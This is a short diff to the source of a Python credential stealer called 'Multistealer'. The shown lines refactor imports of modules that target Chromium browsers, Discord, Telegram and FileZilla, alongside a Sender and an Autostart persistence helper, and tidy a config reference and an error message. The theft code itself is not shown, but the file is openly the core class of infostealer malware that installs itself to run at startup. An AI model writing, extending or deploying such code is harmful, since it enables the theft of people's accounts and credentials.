@@ -3,15 +3,8 @@ from shutil import rmtree
 from threading import Thread
 from os import path, makedirs
 
-from .utils.sender import Sender
-from .utils.autostart import Autostart
-from .utils.config import MultistealerConfig
-
-from .modules.system import System
-from .modules.discord import Discord
-from .modules.browser import Chromium
-from .modules.telegram import Telegram
-from .modules.filezilla import FileZilla
+from .modules import Chromium, Discord, FileZilla, System, Telegram
+from .utils import Autostart, config, Sender
 
 
 class Stealer(Thread):
@@ -24,7 +17,7 @@ class Stealer(Thread):
         self.errors = errors
         self.autostart = autostart
 
-        self.config = MultistealerConfig()
+        self.config = config.MultistealerConfig()
 
         for status in self.config.Functions:
             if status in kwargs:
@@ -142,4 +135,4 @@ class Stealer(Thread):
             Autostart(argv[0], (self.autostart,), self.errors).run()
 
         except Exception as e:
-            if self.errors is True: print(f"[MULTISTEALER]: {repr(e)}")
+            if self.errors is True: print(f"[Multistealer]: {repr(e)}")
